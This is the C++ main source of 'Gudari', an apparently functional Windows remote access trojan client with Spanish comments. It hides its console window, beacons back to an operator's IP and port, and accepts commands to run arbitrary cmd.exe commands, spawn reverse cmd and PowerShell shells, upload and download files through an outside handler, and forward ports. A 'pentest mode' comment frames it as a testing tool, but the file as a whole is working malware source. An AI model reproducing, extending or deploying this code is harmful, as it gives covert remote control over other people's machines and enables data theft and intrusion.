// GudariRAT.cpp: define el punto de entrada de la aplicación de consola.
//

#include "stdafx.h"

int main(int argc, char** argv)
{
	// Creamos un core

	// Modo pentest
	
	if (argc < 3)
	{
		std::cout << "Use: " << argv[0] << " [client_ip] [client_port]" << std::endl;
		return(0);
	}

	HWND hWin;
	hWin = GetForegroundWindow();
	ShowWindow(hWin, false);

	std::string client_ip = argv[1];
	int client_port = atoi(argv[2]);
	//FreeConsole();
	
	// Modo RAT
	/*std::string client_ip = "192.168.1.44";
	int client_port = 4444;
	//FreeConsole();

	CORE core = CORE(client_ip, client_port);*/
	/*
	std::string client_ip = "192.168.1.44";
	int client_port = 4444;
	*/
	CORE core = CORE(client_ip, client_port);
	
	std::vector<std::string> v;

	unsigned char* pwd = (unsigned char *)"abcd";
	std::string ordenRecibida;
	int returnCode;

	core.setPass(pwd);

	while (true)
	{
		if (core.conectar())
		{
			debug("[-] No se ha podido establecer la conexion! Reintentando en 5 segundos...\n");
			Sleep(5000);
		}
		else
		{
			debug("[+] Comunicacion establecida con exito\n");

			if (pintarWelcome(core) != 0)
			{
				Sleep(5000);
			}

			while (true)
			{
				ordenRecibida = core.recibir();
				debug("[+] Orden recibida: " + ordenRecibida + "\n");

				// Parseo
				v.clear();
				std::vector<std::string> v{ explode(ordenRecibida, ' ') };

				if (v.empty())
				{
					break;
				}
				v[0].erase(std::remove(v[0].begin(), v[0].end(), '\n'), v[0].end());

				//showVector(v);
				// Aqui van las opciones
				if (v[0] == "EXEC")
				{
					returnCode = moduloEXEC(v, core);
				}

				if (v[0] == "SPAWN")
				{
					returnCode = moduloSPAWN(v, core);
				}

				if (v[0] == "POWERSHELL")
				{
					returnCode = moduloPOWERSHELL(v, core);
				}

				if (v[0] == "DOWNLOAD")
				{
					returnCode = moduloDOWNLOAD(v, core);
				}

				if (v[0] == "UPLOAD")
				{
					returnCode = moduloUPLOAD(v, core);
				}

				if (v[0] == "FORWARD")
				{
					if (v.size() < 5)
					{
						core.mandar("[-] Use: FORWARD [RHOST] [RPORT] [LHOST] [LPORT]\n");
					}
					else
					{
						PFORWARDDATA estado = new FORWARDDATA{core,v[1],v[2],v[3],v[4] };
						if (estado == NULL)
						{
							ExitProcess(2);
						}

						estado->core = core;
						estado->Lip = v[1];
						estado->Lport = v[2];
						estado->Rip = v[3];
						estado->Rport = v[4];
						CreateThread(
							NULL,                   // default security attributes
							0,                      // use default stack size  
							moduloFORWARD_t,       // thread function name
							estado,          // argument to thread function 
							0,                      // use default creation flags 
							NULL);
					}

					//returnCode = moduloFORWARD(v, core);
				}

				if (v[0] == "SLEEP")
				{
					returnCode = moduloSLEEP(v, core);
				}

				if (v[0] == "HELP")
				{
					returnCode = pintarMenu(core);
				}

				if (v[0] == "EXIT")	// Paramos el programa
				{
					core.mandar("[+] Bye bye! See you soon!\n");
					closesocket(core.getSocket());
					break;
				}

				if (v[0] == "KILL")	// Paramos el programa
				{
					core.mandar("[+] Killing.. Bye bye!\n");
					closesocket(core.getSocket());
					return 0;
				}

				// Esperar un nuevo comando
				/*if (core.mandar("Gudari => ") != 0)
				{
					break;
				}*/
				core.mandar("Response End ");

			}
		}
	}

	return 0;
}

int pintarWelcome(CORE core)
{
	core.mandar("\n"
		"  ________          .___            .__ \n"
		" /  _____/ __ __  __| _/____ _______|__|\n"
		"/   \\  ___|  |  \\/ __ |\\__  \\\\_  __ \\  |\n"
		"\\    \\_\\  \\  | /  /_/ | / __ \\|  | \\/  |\n"
		" \\______  /____/\\____ |(____  /__|  |__|\n"
		"         \\/          \\/     \\/          \n"

		//"\nGudari => "
	);
	return core.mandar("Response End ");
}

int moduloEXEC(std::vector<std::string> v, CORE core)
{
	std::string comando = "cmd.exe /c ";
	if (v.size() > 1)
	{
		// Reconstruimos orden y la ejecutamos
		for (int i = 1; i < v.size(); i++)
		{
			comando = comando + v[i] + " ";
		}
		//debug("[+] Ejecutando: " + comando + "\n");
		std::string output = exec(comando.c_str());
		if (output == "")
		{
			output = "[-] Invalid command ";
		}
		return core.mandar(output);

	}
	else
	{
		return core.mandar("[-] Use: EXEC [command]");
	}
}

int moduloSLEEP(std::vector<std::string> v, CORE core)
{
	if (v.size() < 2)
	{
		core.mandar("[-] Use: SLEEP [seconds]\n");
		return 1;
	}
	else
	{
		core.mandar("[+] Seconds to sleep: " + v[1] + "\n");
		Sleep(atoi(v[1].c_str()) * 1000);
		return 0;
	}
}

int moduloSPAWN(std::vector<std::string> v, CORE core)
{
	if (v.size() < 3)
	{
		core.mandar("[-] Use: SPAWN [target_ip] [port]\n");
		return 1;
	}
	else
	{
		core.mandar("[+] Spawning an interactive shell against " + v[1] + ":" + v[2] + "\n");
		if (spawnInteractiveShell((char*)v[1].c_str(), atoi(v[2].c_str())) != 0)
		{
			core.mandar("[-] Error spawning an interactive shell against " + v[1] + ":" + v[2] + "\n");
			return 1;
		}
		return 0;
	}
}

int moduloPOWERSHELL(std::vector<std::string> v, CORE core)
{
	if (v.size() < 3)
	{
		core.mandar("[-] Use: POWERSHELL [target_ip] [port]\n");
		return 1;
	}
	else
	{
		core.mandar("[+] Spawning an interactive powershell against " + v[1] + ":" + v[2] + "\n");
		if (spawnInteractivePowerShell((char*)v[1].c_str(), atoi(v[2].c_str())) != 0)
		{
			core.mandar("[-] Error spawning an interactive powershell against " + v[1] + ":" + v[2] + "\n");
			return 1;
		}
		return 0;
	}
}

int moduloDOWNLOAD(std::vector<std::string> v, CORE core)
{
	if (v.size() >= 3)
	{
		CORE downloadCore = CORE(v[1], atoi(v[2].c_str()));
		//CORE downloadCore = CORE("192.168.1.40", 80);
		if (downloadCore.conectar() != 0)
		{
			core.mandar("[-] Error creating transfer tunnel\n");
			return 1;
		}
		else
		{
			core.mandar("[+] Downloading " + v[3] + "\n");
		}

		v[3].erase(std::remove(v[3].begin(), v[3].end(), '\n'), v[3].end());
		if (downloadFile(downloadCore.getSocket(), (char*)v[3].c_str()) == 0)
		{
			core.mandar("[+] Sent: " + v[3] + "\n");
			return 0;
		}
		else
		{
			core.mandar("[-] File transfer error " + v[3] + "\n");
			return 1;
		}

	}
	else
	{
		core.mandar("[-] Use: DOWNLOAD [handler_ip] [port] [remote_file_path]\n");
		return 1;
	}

}

int moduloUPLOAD(std::vector<std::string> v, CORE core)
{
	if (v.size() >= 3)
	{
		CORE uploadCore = CORE(v[1], atoi(v[2].c_str()));
		//CORE downloadCore = CORE("192.168.1.40", 80);
		if (uploadCore.conectar() != 0)
		{
			core.mandar("[-] Error creating transfer tunnel\n");
			return 1;
		}
		else
		{
			core.mandar("[+] Uploading " + v[3] + "\n");
		}

		v[3].erase(std::remove(v[3].begin(), v[3].end(), '\n'), v[3].end());
		if (uploadFile(uploadCore.getSocket(), (char*)v[3].c_str()) == 0)
		{
			core.mandar("[+] Uploaded: " + v[3] + "\n");
			return 0;
		}
		else
		{
			core.mandar("[-] File transfer error " + v[3] + "\n");
			return 1;
		}

	}
	else
	{
		core.mandar("[-] Use: UPLOAD [handler_ip] [port] [dst_file_path]  \n");
		return 1;
	}

}

int moduloFORWARD(std::vector<std::string> v, CORE core)
{
	if (v.size() < 5)
	{
		core.mandar("[-] Use: FORWARD [RHOST] [RPORT] [LHOST] [LPORT]\n");
		return 1;
	}
	else
	{

		int ret = bindForward((char*)v[1].c_str(), (char*)v[2].c_str(), (char*)v[3].c_str(), (char*)v[4].c_str(), true);
		v[4].erase(std::remove(v[4].begin(), v[4].end(), '\n'), v[4].end());
		if (ret == 2)
		{
			core.mandar("[+] Forwarding sessions finished between " + v[1] + ":" + v[2] + " <-> " + v[3] + ":" + v[4] + "\n");
		}
		else if (ret != 0)
		{
			core.mandar("[-] Error forwarding " + v[1] + ":" + v[2] + " <-> " + v[3] + ":" + v[4] + "\n");
			return 1;
		}

		return 0;
	}
}

DWORD WINAPI moduloFORWARD_t(LPVOID lpParam)
{
	PFORWARDDATA data;
	data = (PFORWARDDATA)lpParam;

	int ret = bindForward((char*)data->Lip.c_str(), (char*)data->Lport.c_str(), (char*)data->Rip.c_str(), (char*)data->Rport.c_str(), true);
	if (ret == 2)
	{
		data->core.mandar("[+] Forwarding sessions finished between " + data->Lip + ":" + data->Lport + " <-> " + data->Rip + ":" + data->Rport + "\n");
	}
	else if (ret != 0)
	{
		data->core.mandar("[-] Error forwarding " + data->Lip + ":" + data->Lport + " <-> " + data->Rip + ":" + data->Rport + "\n");
		return 1;
	}

	return 0;
}

int pintarMenu(CORE core)
{
	core.mandar("\n"
		"Commands                 Arguments                          Description\n"
		"---------- ---------------------------------------- ------------------------------\n"
		"EXEC         [commands]                               Execute simple system call\n"
		"SPAWN        [handler_ip][port]                       Create a TCP reverse shell\n"
		"DOWNLOAD     [handler_ip][port][remote_file_path]     Download a remote file\n"
		"UPLOAD       [handler_ip][port][dst_file_path]        Upload a local file\n"
		"FORWARD	  [LHOST] [LPORT] [RHOST] [RPORT]		   Forward local port in remote host\n"
		"SLEEP        [seconds]                                Start ninja mode\n"
		"HELP         -                                        Show help menu\n"
		"EXIT         -                                        Close current Gudari session\n"
		"KILL         -                                        Terminate Gudari client process\n"
		"\n");

	return 0;
}
